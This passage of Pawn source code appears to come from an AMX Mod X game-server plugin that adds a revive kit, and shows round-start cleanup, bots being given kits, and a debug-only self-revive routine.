	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

//====================================================
// Round Start.
//====================================================
public RoundStart()
{
	if (g_cvars[RKIT_BOT_HAS_KIT])
		set_task(1.0, "TaskBotBuy");
	
	remove_target_entity_by_classname(ENTITY_CLASS_NAME[CORPSE]);
	remove_target_entity_by_classname(ENTITY_CLASS_NAME[R_KIT]);

	static players[32], num;
	get_players(players, num, "a");
	for(new i = 0; i < num; ++i)
	{
		player_reset(players[i]);
	}
}
	

//====================================================
// Bot has Rkit.
//====================================================
public TaskBotBuy()
{
	static players[32], num;
	get_players_ex(players, num, GetPlayers_ExcludeDead |  GetPlayers_ExcludeHuman);
	for(new i = 0; i < num; ++i) 
	{
		if(!g_player_data[players[i]][HAS_KIT])
			g_player_data[players[i]][HAS_KIT] = true;
	}
}

//====================================================
// ATTENSION:
// Debug mode Self Revive.
//====================================================
#if defined DEBUG_MODE
public DebugRevive(id)
{
	new target, body;

	if (!can_target_revive_debug(id, target, body))
	{
		failed_revive(id);
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 Failed target reviving.");
		return PLUGIN_CONTINUE;
	}

	static Float:velocity[3];
	pev(id, pev_velocity, velocity);
	xs_vec_set(velocity, 0.0, 0.0, velocity[2]);
	set_pev(id, pev_velocity, velocity);		

	if(g_player_data[id][REVIVE_DELAY] < get_gametime())
	{
		if(findemptyloc(body, 10.0))
		{
			set_pev(body, pev_flags, pev(body, pev_flags) | FL_KILLME);			
			emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FINISHED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + target);
		}
	}
	return PLUGIN_CONTINUE;
}

stock bool:can_target_revive_debug(id, &target, &body)
{
	body = find_dead_body_debug(id);
	if(!pev_valid(body))
		return false;
	
	target = pev(body, pev_owner);
	if(!is_user_connected(target))
		return false;

	new lb_team  = get_user_team(target);
	new rev_team = get_user_team(id);
	if(lb_team != 1 && lb_team != 2 || lb_team != rev_team)
		return false;

	return true;
}

stock find_dead_body_debug(id)
{
	new ent = -1;
	while((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", ENTITY_CLASS_NAME[CORPSE])) != 0)
	{
		if (pev(ent, pev_owner) == id)
			return ent;
	}
	return 0;
}
#endif